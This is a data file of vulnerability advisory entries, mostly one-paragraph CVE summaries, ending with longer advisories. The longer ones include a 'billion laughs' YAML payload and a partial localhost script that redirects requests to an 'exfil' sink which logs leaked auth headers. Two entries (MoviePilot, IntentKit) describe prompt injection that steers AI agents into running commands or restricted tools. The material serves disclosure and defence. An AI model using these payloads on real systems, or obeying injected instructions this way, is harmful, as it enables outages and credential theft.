items.title: Backdrop CMS Core 1.35.x before 1.35.2 and 1.34.x before 1.34.6 mishandles tokens. A token is a...
items.summary: Backdrop CMS Core 1.35.x before 1.35.2 and 1.34.x before 1.34.6 mishandles tokens. A token is a small placeholder string (like [node:title] or [user:name]) used to automatically insert dynamic data into text. A browser is provided for selecting tokens by type. The product doesn't sufficiently limit access to the types of tokens that are available in the token browser. The names of the individual tokens are adequately protected.

items.title: Netgate pfSense FRR package (pfSense-pkg-frr) 2.0.2_1 and source revision 2.1.2_1 contain an OS...
items.summary: Netgate pfSense FRR package (pfSense-pkg-frr) 2.0.2_1 and source revision 2.1.2_1 contain an OS command injection vulnerability in the FRR status filter. An authenticated WebGUI user with only the page-status-frr privilege can supply a filter value that breaks out of a single-quoted sed expression into which escapeshellarg() output is concatenated. Shell command substitution is then evaluated by a popen() pipeline, allowing attacker-selected commands to execute as root. There are updated FRR packages for pfSense Plus 26.07/26.03.1 and CE 2.9.0/2.8.1.

items.title: MoviePilot through 3.1.5 contains a command injection vulnerability that allows attackers to...
items.summary: MoviePilot through 3.1.5 contains a command injection vulnerability that allows attackers to execute arbitrary OS commands by embedding malicious instructions in untrusted content processed through tools like browse_webpage, search_web, and torrent metadata parsers, which then get passed to the unrestricted ExecuteCommandTool via asyncio.create_subprocess_shell. Attackers can craft content that instructs the model to invoke execute_command with confirm_dangerous set to true, bypassing the validate_command_safety denylist and exploiting the admin session's is_admin context to achieve remote code execution on the host.

items.title: Wheels CLI through 4.1.0 does not verify that the local development server answering its HTTP...
items.summary: Wheels CLI through 4.1.0 does not verify that the local development server answering its HTTP requests belongs to the current project. A process listening on a port targeted by the CLI can receive the project's reload password and code submitted through wheels reload or wheels console; console also probes common ports when the project server is down. Other commands can perform unintended state-changing operations against a different local application's server and database. Exploitation requires a process listening on a targeted local port and the developer running an affected command. This is fixed in 4.1.1, including changes to the CLI and application template.

items.title: IntentKit through 2.6.3 contains an authorization bypass vulnerability where the executor...
items.summary: IntentKit through 2.6.3 contains an authorization bypass vulnerability where the executor validates tool calls against the full tool registry rather than the per-request narrowed tool advertisement enforced by ToolBindingMiddleware, allowing owner-only state-changing tools such as wallet transfer, posting, memory-write, and call-agent to execute without any human-in-the-loop or approval gate. An unauthenticated or public caller in WEB, API, TWITTER, or TELEGRAM contexts can exploit this by supplying the exact de-advertised tool name and arguments via indirect prompt injection or by replaying checkpoint and history data on a reused thread, achieving unauthorized execution of owner-restricted capabilities.

items.title: A vulnerability was detected in ggml-org whisper.cpp up to 1.9.4. This affects the function...
items.summary: A vulnerability was detected in ggml-org whisper.cpp up to 1.9.4. This affects the function whisper_model_load of the file src/whisper.cpp of the component Model Loader. Performing a manipulation of the argument ttype results in out-of-bounds read. The attack must be initiated from a local position. The exploit is now public and may be used. Upgrading to version 1.9.5 is able to mitigate this issue. The patch is named 60c0be6ac8fa71b1a2ae2dd938a31a34a508e774. It is recommended to upgrade the affected component. The vendor was contacted early, responded in a very professional manner and quickly released a fixed version of the affected product.

items.title: SODOLA SL902-SWTGW124AS firmware before 200.2.12 contains a buffer overflow vulnerability that...
items.summary: SODOLA SL902-SWTGW124AS firmware before 200.2.12 contains a buffer overflow vulnerability that allows unauthenticated remote attackers to cause a denial of service by sending an oversized boundary value in the Content-Type header of a crafted POST request. Attackers can exploit the embedded HTTP server's multipart/form-data boundary parser to cause the device to become fully unresponsive — dropping all management access and traffic forwarding during its self-recovery cycle.

items.title: ApostropheCMS before 4.33.0 allows authentication bypass for REST API page reading, as...
items.summary: ApostropheCMS before 4.33.0 allows authentication bypass for REST API page reading, as demonstrated by a /api/v1/@apostrophecms/page?all=1 call.

items.title: Ellucian WebAdvisor 3.2 contains an unauthenticated XML External Entity (XXE) injection...
items.summary: Ellucian WebAdvisor 3.2 contains an unauthenticated XML External Entity (XXE) injection vulnerability that allows remote attackers to submit crafted XML POST requests to the /WebAdvisor/WebAdvisor endpoint without disabling external entity and DTD resolution. Attackers can exploit this flaw to force the server into SSRF requests, coerce NTLMv2 hash disclosure via attacker-controlled SMB shares, and read arbitrary files from the underlying Windows host through an out-of-band error-based channel. WebAdvisor entered end-of-support status in June 2022 and users are encouraged to migrate to Colleague Self-Service.

items.title: Nodemailer from 3.0.0 before 10.0.10 contains a denial of service vulnerability in MessageParser...
items.summary: Nodemailer from 3.0.0 before 10.0.10 contains a denial of service vulnerability in MessageParser.parseHeaders that allows users to exhaust CPU through quadratic header unfolding. Attackers can supply large recipient lists or long headers that fold into tens of thousands of continuation lines, blocking the Node.js event loop during DKIM signing.

items.title: Heym from 0.0.55 before 0.0.121 contains a privilege escalation vulnerability that allows shared...
items.summary: Heym from 0.0.55 before 0.0.121 contains a privilege escalation vulnerability that allows shared collaborators to overwrite a workflow's error_workflow_id because the field is missing from OWNER_ONLY_EXECUTION_FIELDS. Attackers can point the error workflow to their own workflow with an HTTP node, and when the parent workflow errors the owner's decrypted credentials are injected and exfiltrated.

items.title: Better Auth from 1.5.0-beta.12 before 1.7.7 contains an authentication bypass vulnerability in...
items.summary: Better Auth from 1.5.0-beta.12 before 1.7.7 contains an authentication bypass vulnerability in the OAuth Proxy plugin that allows unauthenticated attackers to sign in as other users by forging encrypted profiles. When the proxy shares the global secret and cookie-stored state is used, attackers can obtain encrypted state for a fake profile with a victim's verified email to take over the account via implicit linking.

items.title: Nodemailer 3.0.0 before 10.0.13 has a regular expression denial of service in SMTPConnection...
items.summary: Nodemailer 3.0.0 before 10.0.13 has a regular expression denial of service in SMTPConnection._actionEHLO, whose four AUTH mechanism detection regexes contain overlapping whitespace sub-patterns that backtrack quadratically. A malicious or man-in-the-middle SMTP server can reply to EHLO with 250-AUTH, a long whitespace run and a non-matching token, blocking the Node.js event loop for tens of seconds to hours before authentication.

items.title: Renovate before 44.79.0 contains a server-side request forgery vulnerability that allows users to...
items.summary: Renovate before 44.79.0 contains a server-side request forgery vulnerability that allows users to make the shared HTTP client request arbitrary internal URLs via extends presets or customDatasources. Attackers can point a preset at an instance metadata service endpoint to obtain AWS credentials or leak sensitive information through Renovate logs.

items.title: A security vulnerability has been detected in sgl-project SGLang up to 0.5.19. Affected by this...
items.summary: A security vulnerability has been detected in sgl-project SGLang up to 0.5.19. Affected by this issue is the function Session.create_req of the file python/sglang/srt/session/session_controller.py of the component Session Cleanup. Such manipulation leads to denial of service. The attack may be performed from remote. The exploit has been disclosed publicly and may be used. The pull request to fix this issue awaits acceptance.

items.title: Renovate before 44.61.3 contains a protection mechanism bypass vulnerability that allows...
items.summary: Renovate before 44.61.3 contains a protection mechanism bypass vulnerability that allows minimumReleaseAge checks to be skipped when a user requests a PR rebase via the rebase/retry checkbox. Attackers who publish a malicious dependency version can have it pushed into the PR and run in CI before the required release age elapses.

items.title: Renovate before 44.60.1 contains an allowlist bypass vulnerability that allows repositories to...
items.summary: Renovate before 44.60.1 contains an allowlist bypass vulnerability that allows repositories to set restricted environment variables by placing env inside a shared preset. Attackers controlling an externally sourced preset can override variables like PATH, LD_PRELOAD, NODE_OPTIONS, or GIT_SSL_CAINFO in child processes on self-hosted instances.

items.title: Renovate before 44.60.1 contains an allowlist bypass vulnerability that allows repository users...
items.summary: Renovate before 44.60.1 contains an allowlist bypass vulnerability that allows repository users to evade the allowedHeaders restriction by placing hostRules headers inside shared presets. Attackers can supply internal or externally sourced presets with unvalidated hostRules[].headers to inject custom HTTP headers into requests Renovate sends to other hosts.

items.title: Nodemailer from 3.0.0 before 10.0.13 contains an improper input validation vulnerability in its...
items.summary: Nodemailer from 3.0.0 before 10.0.13 contains an improper input validation vulnerability in its address parser that fails to strip RFC 5322 comments inside angle-bracket addresses. Attackers can supply recipients like a display name with a parenthesized comment in the domain, so illegal characters reach envelope.to and RCPT TO, causing rejected delivery or parser interpretation conflicts that bypass domain allow-lists.

items.title: Better Auth @better-auth/sso from 1.7.0-rc.2 before 1.7.3 contains an authentication bypass...
items.summary: Better Auth @better-auth/sso from 1.7.0-rc.2 before 1.7.3 contains an authentication bypass vulnerability that allows authenticated users to sign in as other users by registering a personal SSO provider. Attackers can copy a legitimate provider's OIDC issuer or SAML entity ID and assert a victim's subject or NameID, because account lookup ignores providerId, creating sessions for victim accounts.

items.title: Nodemailer from 3.0.0 before 10.0.10 contains a quadratic complexity denial of service...
items.summary: Nodemailer from 3.0.0 before 10.0.10 contains a quadratic complexity denial of service vulnerability in the SMTP client reply parser in SMTPConnection._onData and isPartialResponse. A malicious SMTP server or on-path attacker can stream continuation lines without a completion line before authentication, blocking the Node.js event loop and exhausting memory.

items.title: Better Auth @better-auth/drizzle-adapter and better-auth from 1.6.17 before 1.7.7, and @better...
items.summary: Better Auth @better-auth/drizzle-adapter and better-auth from 1.6.17 before 1.7.7, and @better-auth/kysely-adapter from 1.6.17 before 1.7.0, contain a race condition in database-backed rate limiting on PostgreSQL where the limit check is not atomic with the counter update. Remote attackers can send bursts of concurrent requests that pass the check together, exceeding configured limits on password sign-in, two-factor verification, one-time code, password reset, and other rate-limited endpoints.

items.title: n8n before 2.41.4 and 2.42.x before 2.42.1 contains an authorization bypass in the Agents create...
items.summary: n8n before 2.41.4 and 2.42.x before 2.42.1 contains an authorization bypass in the Agents create endpoint, which accepts a caller-supplied Agent ID, checks permissions only against the requested project, and updates an existing Agent without verifying which project owns it. An authenticated user with read-only Agent access to another project can supply an existing Agent ID to move that Agent into their own project and rewrite its name, schema and version.

items.title: GitPython before 3.2.0 contains an argument injection vulnerability in Head.checkout() that...
items.summary: GitPython before 3.2.0 contains an argument injection vulnerability in Head.checkout() that allows remote attackers to read arbitrary files by supplying a branch name parsed as a git option. Attackers can host a repository whose default branch is named --pathspec-from-file=<path>, causing cloning applications that check out the active branch to leak file contents through GitCommandError messages.

items.title: Better Auth from 1.4.0-beta.18 before 1.7.7 contains an authentication bypass vulnerability that...
items.summary: Better Auth from 1.4.0-beta.18 before 1.7.7 contains an authentication bypass vulnerability that allows unauthenticated attackers to sign in as other users by reusing OAuth state values as Magic Link tokens. Attackers can start an OAuth sign-in with a victim's email and submit the returned state to Magic Link verification, gaining sessions or creating falsely email-verified accounts.

items.title: GitPython from 3.1.30 before 3.2.0 contains a remote code execution vulnerability in Remote.pull(...
items.summary: GitPython from 3.1.30 before 3.2.0 contains a remote code execution vulnerability in Remote.pull() whose unsafe-option guard inspects only keyword arguments, not the positional refspec. Attackers controlling the refspec can supply --upload-pack=<command> to execute OS commands as the calling process over local-path or SSH transports.

items.title: GitPython before 3.2.0 contains a remote code execution vulnerability that allows attackers to...
items.summary: GitPython before 3.2.0 contains a remote code execution vulnerability that allows attackers to run commands because Git.ls_remote forwards URLs without check_unsafe_protocols validation. Attackers can supply ext:: remote-helper URLs to execute commands when git permits the ext transport, while merge_base and IndexFile.move also accept unguarded option injection.

items.title: n8n before 1.123.83, 2.x before 2.41.4, and 2.42.x before 2.42.1 contains an authentication...
items.summary: n8n before 1.123.83, 2.x before 2.41.4, and 2.42.x before 2.42.1 contains an authentication bypass because dynamic-path webhook resolution matched requests on the path alone, ignoring the server-generated identifier that is the URL's only unguessable component. Unauthenticated attackers can omit this identifier in requests to webhook, form, or MCP routes to execute workflows in unrelated projects under those projects' credentials.

items.title: Parse Server before 8.6.97 and 9.0.0 before 9.10.2-alpha.6 does not handle errors raised while...
items.summary: Parse Server before 8.6.97 and 9.0.0 before 9.10.2-alpha.6 does not handle errors raised while sending verification or password reset emails, causing the server process to exit. A client holding only the public application keys can sign up, request a verification email, or request a password reset while the mail provider rejects, rate limits, or is unavailable, crashing the server.

items.title: GitPython before 3.2.0 contains a regular expression denial of service vulnerability in the...
items.summary: GitPython before 3.2.0 contains a regular expression denial of service vulnerability in the _re_actor_epoch pattern used by parse_actor_and_date on author, committer, and tagger lines. Attackers can serve repositories with commit or tag objects containing long space-filled lines lacking a valid epoch or timezone, causing quadratic backtracking and CPU exhaustion.

items.title: GitPython before 3.2.0 contains an information disclosure vulnerability that allows malicious...
items.summary: GitPython before 3.2.0 contains an information disclosure vulnerability that allows malicious repositories to expand environment variables via separate_git_dir in Repo._clone(), which omits expand_vars=False when calling Git.polish_url(). Attackers can craft a .gitmodules submodule name containing variable syntax so that clone plus submodule_update exposes secrets in .git/modules directory names and DEBUG logs.

items.title: GitPython from 3.1.62 before 3.2.0 contains a symlink-following flaw in Submodule.move(), which...
items.summary: GitPython from 3.1.62 before 3.2.0 contains a symlink-following flaw in Submodule.move(), which checks the destination only lexically and does not reject symbolic links in intermediate path components. An untrusted repository can commit a symlink such as vendor pointing outside the worktree, so an application moving an initialized submodule beneath it relocates the checkout externally and corrupts the index and .gitmodules.

items.title: n8n before 1.123.83 contains an authorization bypass vulnerability that allows authenticated...
items.summary: n8n before 1.123.83 contains an authorization bypass vulnerability that allows authenticated members to spoof workflow identity by supplying a trusted identifier in Execute Sub-workflow inline JSON mode. Attackers can set this identifier to resolve credentials from projects they do not belong to and modify another workflow's static data and error-workflow dispatch.

items.title: n8n before 2.41.4 and 2.42.x before 2.42.1 contains a signature bypass in the waiting-webhook...
items.summary: n8n before 2.41.4 and 2.42.x before 2.42.1 contains a signature bypass in the waiting-webhook endpoint, which selects Send-and-Wait validation before normalising an alternate node reference form. Attackers holding an execution's resume token can approve waiting executions meant for others, running downstream actions under the workflow owner's credentials, potentially including command execution.

items.title: n8n before 1.123.83 contains an authorization bypass vulnerability that allows shared-workflow...
items.summary: n8n before 1.123.83 contains an authorization bypass vulnerability that allows shared-workflow editors to use credentials they cannot access by embedding them in nested or tool inline sub-workflows. Attackers can save workflows with Workflow Tool or Workflow Retriever inline definitions referencing restricted credentials, which execute using the workflow owner's credential values.

items.title: n8n before 1.123.83, 2.x before 2.41.4, and 2.42.x before 2.42.1 contains a prototype pollution...
items.summary: n8n before 1.123.83, 2.x before 2.41.4, and 2.42.x before 2.42.1 contains a prototype pollution vulnerability in the AI workflow builder, which merges workflow connections using node names as object members without checking for reserved keys. Authenticated users can create nodes named __proto__ through the API and invoke the connect-nodes operation to pollute the global object prototype, disrupting the instance until restart.

items.title: n8n before 2.41.4 and 2.42.0 contains an authorization bypass in the agent chat resume endpoint,...
items.summary: n8n before 2.41.4 and 2.42.0 contains an authorization bypass in the agent chat resume endpoint, which accepts a run identifier from the request body without verifying that the suspended checkpoint belongs to the caller. Authenticated project members can list and read other members' private agent conversations through project-scoped endpoints, then approve their pending tool calls, causing the tools to execute and write results into the victim's conversation.

items.title: n8n before 1.123.83, 2.x before 2.41.4, and 2.42.x before 2.42.1 contains a code execution...
items.summary: n8n before 1.123.83, 2.x before 2.41.4, and 2.42.x before 2.42.1 contains a code execution vulnerability in the Git node Log operation, which fails to strip a repository's local git configuration before invoking an external program. Authenticated members who can point the node, including as an agent tool, at a repository whose local configuration they control can execute programs as the n8n process user.

items.title: n8n before 1.123.83, 2.x before 2.41.4, and 2.42.x before 2.42.1 contains a stored cross-site...
items.summary: n8n before 1.123.83, 2.x before 2.41.4, and 2.42.x before 2.42.1 contains a stored cross-site scripting vulnerability in the Chat Trigger hosted-chat page, where insufficiently sanitised customCss values are interpolated into the page as markup. Workflow authors can publish a chat without n8n user authentication whose payload executes on the instance origin, acting on the sessions of signed-in visitors.

items.title: n8n before 1.123.83, 2.41.4, and 2.42.1 contains a stored cross-site scripting vulnerability in...
items.summary: n8n before 1.123.83, 2.41.4, and 2.42.1 contains a stored cross-site scripting vulnerability in the file-preview modal, which re-publishes binary data as an unsandboxed same-origin blob URL. A member who uploads a crafted item can run script in the n8n origin of whoever previews it, typically the owner, and act with their session.

items.title: n8n before 2.41.4 and 2.42.0 before 2.42.1 does not validate credential ids stored in agent node...
items.summary: n8n before 2.41.4 and 2.42.0 before 2.42.1 does not validate credential ids stored in agent node parameters when an editor saves a shared workflow, because the check inspects only a node's credentials field. An editor can configure a Message an Agent node in inline mode with tools they control to resolve the owner's credentials and send decrypted secrets to an attacker-chosen destination.

items.title: n8n before 2.41.4 and 2.42.x before 2.42.1 contains a prototype pollution vulnerability in the...
items.summary: n8n before 2.41.4 and 2.42.x before 2.42.1 contains a prototype pollution vulnerability in the MCP workflow-validation tool, whose interpreter evaluates caller-supplied code in the main process, reads inherited properties, and permits assignment onto shared prototypes. An authenticated member holding only a workflow:read grant can replace a built-in method with one returning a truthy value so server-side permission checks accept unheld scopes, enabling takeover of owner accounts not protected by MFA.

items.title: n8n before 2.41.4 and 2.42.x before 2.42.1 contains an uncontrolled resource consumption...
items.summary: n8n before 2.41.4 and 2.42.x before 2.42.1 contains an uncontrolled resource consumption vulnerability in the unauthenticated OAuth authorize endpoint, which resolves clients by URL path but stores the caller's raw identifier as the record key. Unauthenticated attackers can send identifiers differing only in their query string to create unlimited first-party client records that bypass the registration cap, growing the database until the disk fills.

items.title: FreeRDP from 3.0.0-beta1 before 3.32.0 fails to enforce cumulative or absolute size limits when...
items.summary: FreeRDP from 3.0.0-beta1 before 3.32.0 fails to enforce cumulative or absolute size limits when reassembling RDPDR channel fragments in the proxy. Attackers can send a FIRST fragment followed by continuation fragments without LAST, growing per-session heap streams proportional to traffic and exhausting proxy memory.

items.title: FreeRDP 2.0.0 before 3.32.0, when built with WITH_LAME=ON and WITH_DSP_FFMPEG=OFF, has a heap...
items.summary: FreeRDP 2.0.0 before 3.32.0, when built with WITH_LAME=ON and WITH_DSP_FFMPEG=OFF, has a heap-based buffer overflow in freerdp_dsp_decode_mp3 because the right-channel PCM pointer is offset by a byte count treated as short elements. A malicious RDP server can send MP3 audio over rdpsnd so decoded samples cross the heap allocation, crashing the client.

items.title: FreeRDP versions 3.13.0 before 3.32.0 contain a resource retention flaw in...
items.summary: FreeRDP versions 3.13.0 before 3.32.0 contain a resource retention flaw in drive_process_irp_create, which registers an opened local file in the drive dictionary before applying the allocation size and does not remove it when that operation fails. A malicious RDP server connected to a client with drive redirection enabled can send IRP_MJ_CREATE with AllocationSize set to UINT64_MAX, forcing the seek to fail and leaking the file object and operating-system handle until drive teardown.

items.title: FreeRDP from 2.0.0 before 3.32.0 contains a null pointer dereference vulnerability that allows...
items.summary: FreeRDP from 2.0.0 before 3.32.0 contains a null pointer dereference vulnerability that allows malicious RDP servers to crash clients by sending out-of-lifecycle serial IRPs. Attackers can send IRP_MJ_READ or IRP_MJ_WRITE before create or after close, causing CommReadFile or CommWriteFile to dereference a null handle and terminate clients using Linux serial redirection.

items.title: n8n before 2.41.4 and 2.42.x before 2.42.1 contains an SQL injection vulnerability in version 1...
items.summary: n8n before 2.41.4 and 2.42.x before 2.42.1 contains an SQL injection vulnerability in version 1 of the Microsoft SQL node, which substitutes Query field expression values directly into SQL text without parameterisation. When a workflow binds untrusted input such as webhook fields to the Query field, unauthenticated external callers can execute arbitrary SQL against the connected database with the stored credential's privileges.

items.title: A weakness has been identified in sgl-project SGLang up to 0.5.19. Affected by this vulnerability...
items.summary: A weakness has been identified in sgl-project SGLang up to 0.5.19. Affected by this vulnerability is an unknown functionality of the file python/sglang/srt/managers/io_struct.py of the component generate Endpoint. This manipulation of the argument session_params causes denial of service. The attack is possible to be carried out remotely. The exploit has been made available to the public and could be used for attacks. The project was informed of the problem early through an issue report but has not responded yet.

items.title: FreeRDP shadow server from 3.0.0 before 3.32.0 dispatches input PDUs during the Confirm Active...
items.summary: FreeRDP shadow server from 3.0.0 before 3.32.0 dispatches input PDUs during the Confirm Active state before authentication, allowing unauthenticated attackers to inject keyboard input. Attackers can negotiate TLS-only RDP and send an input PDU without Confirm Active to inject synthetic keystrokes into the host user's X11 session via XTEST.

items.title: FreeRDP before 3.32.0 fails to close prior serial handles in serial_process_irp_create, allowing...
items.summary: FreeRDP before 3.32.0 fails to close prior serial handles in serial_process_irp_create, allowing a malicious RDP server to exhaust file descriptors. Attackers can send repeated serial IRP_MJ_CREATE requests to accumulate descriptors and terminate the client at the CommReadFile FD_SETSIZE assertion.

items.title: FreeRDP versions from 3.0.0 before 3.32.0 contain a null pointer dereference in the rdpsnd...
items.summary: FreeRDP versions from 3.0.0 before 3.32.0 contain a null pointer dereference in the rdpsnd channel when a fragment sets CHANNEL_FLAG_LAST without CHANNEL_FLAG_FIRST. A malicious RDP server can send a malformed rdpsnd PDU on a fresh channel to crash the client and cause denial of service.

items.title: FreeRDP 3.0.0 before 3.32.0 allows HTTP header injection in its proxy because a lone LF in the...
items.summary: FreeRDP 3.0.0 before 3.32.0 allows HTTP header injection in its proxy because a lone LF in the target portion of a routing token (Cookie: msts=) is not rejected and is written by http_proxy_connect into the CONNECT request line and Host header. A remote unauthenticated RDP client connecting to a proxy using FixedTarget=false and an upstream HTTP proxy can alter HTTP request/header framing at that upstream proxy.

items.title: FreeRDP from 2.0.0 before 3.32.0 contains a memory exhaustion vulnerability in...
items.summary: FreeRDP from 2.0.0 before 3.32.0 contains a memory exhaustion vulnerability in wts_read_drdynvc_data_first that allows authenticated clients to force servers to commit large memory allocations. Attackers can send a seven-byte DATA_FIRST message on an opened DVC declaring a large 32-bit length, causing zeroed resident memory growth and server resource exhaustion.

items.title: FreeRDP 3.3.0 before 3.32.0, when built with WINPR_UTILS_IMAGE_JPEG=ON, has a heap-based out-of...
items.summary: FreeRDP 3.3.0 before 3.32.0, when built with WINPR_UTILS_IMAGE_JPEG=ON, has a heap-based out-of-bounds write in winpr_convert_from_jpeg because grayscale JPEG buffers are sized from one input component rather than three BGR output components. A malicious RDP server can offer a grayscale JPEG via clipboard redirection, corrupting client memory and crashing it when the item is pasted as CF_DIB bitmap data.

items.title: FreeRDP from 3.0.0 before 3.32.0 contains an infinite loop vulnerability in http_response_recv()...
items.summary: FreeRDP from 3.0.0 before 3.32.0 contains an infinite loop vulnerability in http_response_recv() that allows malicious gateways to exhaust client CPU via crafted Content-Type headers. Attackers controlling a gateway can return a nonzero Content-Length with a semicolon-containing unrecognized Content-Type, pinning a client thread at full CPU indefinitely.

items.title: Omada Controller's MSP and OpenAPI certificate/private-key management APIs do not properly...
items.summary:
Omada Controller's MSP and OpenAPI certificate/private-key management APIs do not properly enforce administrative authorization, allowing an authenticated user to perform privileged certificate management operations. 

Successful exploitation may allow a low-privileged authenticated user to upload or delete the controller's TLS certificate or private key, potentially disrupting secure management access.

items.title: A vulnerability was detected in turboderp ExLlamaV2 up to 0.3.2. Affected is the function STFile...

items.title: Microsoft.OpenApi.YamlReader vulnerable to denial of service via YAML alias expansion
items.summary:
### Impact

A small YAML OpenAPI document containing nested anchors and aliases can cause uncontrolled resource consumption in Microsoft.OpenApi.YamlReader and Microsoft.OpenApi.Readers. The issue affects OpenAPI document parsing through the public YAML reader APIs and can cause the parsing process to allocate excessive memory and terminate through out-of-memory conditions.

## Affected versions

### Microsoft.OpenApi.YamlReader

* `>= 2.0.0-preview.11, < 2.12.0`
* `>= 3.0.0, < 3.10.0`

### Microsoft.OpenApi.Readers

* `< 1.6.30`

### Patches

* For the 1.X major version, versions 1.6.30 and above are patched.
* For the 2.X major version, versions 2.12.0 and above are patched.
* For the 3.X major version, versions 3.10.0 and above are patched.

## Impact

Applications, CLIs, developer tools, or services that parse untrusted YAML OpenAPI documents in-process may be terminated by a crafted YAML document containing nested anchors and aliases.

The impact is availability/process termination only. This report does not claim remote code execution, authentication bypass, credential exposure, privilege escalation, data exposure, or Microsoft hosted service impact.

## Details

Microsoft.OpenApi.YamlReader and Microsoft.OpenApi.Readers parses YAML through SharpYaml. SharpYaml represents aliases as shared `YamlNode` instances in a directed acyclic graph, so the initial parsed YAML graph remains small. During conversion to `System.Text.Json.Nodes.JsonNode`, aliases must be materialized as independent nodes because `JsonNode` instances cannot be attached to multiple parents.

Without a bound on that conversion work, a small YAML document using nested anchors and aliases can expand exponentially during conversion. With `N` nested anchors each referenced `k` times, conversion can require `k^N` materialized JSON nodes, leading to excessive memory allocation and possible process termination.

This is an uncontrolled resource consumption vulnerability, also known as a "billion laughs" style denial of service.

### Example payload

```yaml
openapi: 3.0.0
info:
  title: Test
  version: 0.0.1
paths: {}
x-a: &a ["lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol"]
x-b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a]
x-c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b]
x-d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c]
x-e: &e [*d, *d, *d, *d, *d, *d, *d, *d, *d]
x-f: &f [*e, *e, *e, *e, *e, *e, *e, *e, *e]
```

## Remediation

Users should upgrade to Microsoft.OpenApi.YamlReader `2.12.0` or `3.10.0`, or Microsoft.OpenApi.Readers `1.6.30`, depending on the major version line they consume.

The patched versions bound YAML-to-JSON conversion work and fail fast instead of allowing unbounded expansion. The default limits are:

* Maximum materialized node count: `5,000,000`
* Maximum nesting depth: `64`

When the limits are exceeded, `OpenApiYamlReader.Read` reports an `OpenApiDiagnostic` error and does not return a parsed document.

The limits are exposed as process-wide static properties on `YamlConverter` for consumers that need to tune them for trusted workloads:

* `YamlConverter.MaxNodeCount`
* `YamlConverter.MaxDepth`

Applications that parse OpenAPI documents from untrusted sources should avoid parsing those documents in the primary application process when possible. Running parsing in an isolated process can reduce the blast radius of parser failures.

items.title: Metalama allows local code execution through DLL planting in shared temporary directories
items.summary:
## Summary

Metalama loaded and executed compile-time assemblies, auxiliary executable tools, and embedded helper assemblies from predictable temporary directories. On Linux and macOS the default cache location was the world-writable system temporary directory (`Path.GetTempPath()`, i.e. `/tmp`), and previously-generated artifacts were trusted based on the presence of a sentinel/`.completed` marker file rather than on any integrity verification.

A local, unprivileged user on a shared machine or CI/build agent can pre-create the deterministic cache directory structure and plant a malicious DLL together with the matching sentinel file. When a higher-privileged user (or build/service account) subsequently runs a build, Metalama finds the sentinel, skips regeneration, and loads and executes the attacker-supplied assembly inside the compiler / IDE / MSBuild process.

Affected load-and-execute paths:
- the cache of compile-time assemblies that Metalama generates from your aspects;
- auxiliary executable tools that Metalama extracts to a local directory and then launches;
- embedded .NET helper assemblies that Metalama extracts to a local directory and loads into the build / IDE process.

## Impact

Arbitrary code execution in the security context of the building user — i.e. a local privilege escalation across user accounts on shared POSIX systems (multi-user developer machines, CI/build agents). The attacker obtains code execution as the victim without holding the victim's privileges, and can read source/secrets, tamper with build output (supply-chain injection), or disrupt builds.

## Affected configurations

- **Linux and macOS, default configuration — affected.** The shipped default uses the world-writable system temp directory.
- **Windows, default configuration — not affected.** The default per-user temporary directory is protected by OS ACLs, so cross-user planting is not possible.
- The `METALAMA_TEMP` environment variable is a deployer-controlled override and is **out of scope**: pointing it at an insecure (e.g. world-writable or attacker-owned) location is a deployment misconfiguration, not a defect in the product.

## Severity

CVSS v3.1: `AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H` = **8.2 (High)** for the affected POSIX default configuration (Scope:Changed reflects the cross-user privilege escalation).

CVSS v4.0 cross-check: `CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:P/VC:L/VI:H/VA:L/SC:L/SI:H/SA:H` = 6.0 (Medium), which more granularly attributes low impact to the cache itself and high impact to the subsequent build process. The honest range is therefore Medium-High depending on the scoring model and platform.

## Fix

Caches and extraction directories were relocated from the world-writable system temp directory to per-user application-data locations (`$XDG_CACHE_HOME` / `~/.cache/Metalama` on POSIX), relying on OS-enforced per-user ownership as the trust boundary. Fixed in **2026.1.19**.

## Weaknesses

- CWE-377: Insecure Temporary File
- CWE-427: Uncontrolled Search Path Element

## Affected packages

- Metalama.Framework < 2026.1.19, 
- Metalama.Tool < 2026.1.19

Internal tracking: metalama/Metalama#1650.

items.title: Apprise forwards configured auth headers across cross-origin HTTP redirects
items.summary:
# Summary

Apprise's HTTP-based notification plugins and its HTTP attachment / config loaders (`apprise/attachment/http.py`, `apprise/config/http.py`) follow HTTP 3xx redirects by default and **re-send the user-configured auth headers and query parameters on the redirected request**. If an operator-configured destination is later compromised (service takeover, malicious update), or an attacker holds a MITM position on an unprotected network path, that destination can return a `302 Location:` to an arbitrary host and Apprise forwards the user's secret (`X-Gotify-Key`, `Authorization`, bearer tokens in query, custom `+Header=` values) to that cross-origin host. The attacker does **not** need to control the original Apprise URL — only the response from a destination the operator already trusts.

This is the application-layer analogue of urllib3 [`GHSA-34jh-p97f-mpxf`](https://github.com/urllib3/urllib3/security/advisories/GHSA-34jh-p97f-mpxf) / `CVE-2026-44431` ("`Proxy-Authorization` forwarded across cross-origin redirect").

# Affected versions

All releases up to and including `v1.10.0` (latest PyPI release as of filing, 2026-04-26). Fixed in v1.11.0 (released 2026-05-29), which includes [PR #1610](https://github.com/caronc/apprise/pull/1610) (merged 2026-05-16, commit 68c0aef218055e4586cf4605fd6b56358f5f462d).

# Details

`apprise/plugins/gotify.py` (pre-fix HEAD, lines 226-244, verbatim):

```python
headers = {
    "User-Agent": self.app_id,
    "Content-Type": "application/json",
    "X-Gotify-Key": self.token,    # user-supplied secret
}
...
r = requests.post(
    url,
    data=dumps(payload),
    headers=headers,
    verify=self.verify_certificate,
    timeout=self.request_timeout,
    # NO allow_redirects=False -- requests default is True
)
```

`requests` follows 3xx redirects by default and re-attaches the `headers=` dict on the redirected request, regardless of origin. The same shape exists across ~50 plugins (`custom_json`, `custom_xml`, `custom_form`, `gotify`, `ntfy`, `mattermost`, `apprise_api`, and most other HTTP-based plugins), plus in `apprise/attachment/http.py` and `apprise/config/http.py`.

## Reproduction (local, safe)

```python
# attacker_redirector.py -- 127.0.0.1:8081 returns 302 to a cross-origin sink
import http.server
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        self.send_response(302)
        self.send_header("Location", "http://127.0.0.1:8082/exfil")
        self.end_headers()
http.server.HTTPServer(("127.0.0.1", 8081), H).serve_forever()
```

```python
# attacker_sink.py -- 127.0.0.1:8082 logs the leaked headers
import http.server
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        print("LEAKED HEADERS:", dict(self.headers))
